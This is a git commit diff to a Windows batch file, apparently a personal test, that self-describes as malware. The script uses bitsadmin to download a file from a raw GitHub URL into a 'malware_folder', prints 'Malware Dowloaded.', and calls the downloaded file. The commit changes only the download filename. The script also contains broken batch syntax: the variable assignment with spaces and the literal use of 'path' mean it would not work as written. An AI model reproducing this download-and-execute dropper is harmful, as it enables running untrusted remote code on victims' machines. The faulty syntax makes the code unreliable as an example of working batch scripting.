8ca6ad9bb7d60a0a2c205364c00b1cfd28bc4ca7
duydang2002 <76654292+duydang2002@users.noreply.github.com>
2024-12-25 09:31:36 +0700

    Update test.bat

--- test.bat
+++ test.bat
@@ -4,7 +4,7 @@
 echo Hello, this is a BAT file!
 set path = C:\Users\Public\malware_folder
 mkdir path
-bitsadmin /transfer download https://raw.githubusercontent.com/duydang2002/TestScript/refs/heads/main/test.bat path
+bitsadmin /transfer download https://raw.githubusercontent.com/duydang2002/TestScript/refs/heads/main/test.bat2 path
 echo Malware Dowloaded.
 call path Code1, Code2, Code3
 pause
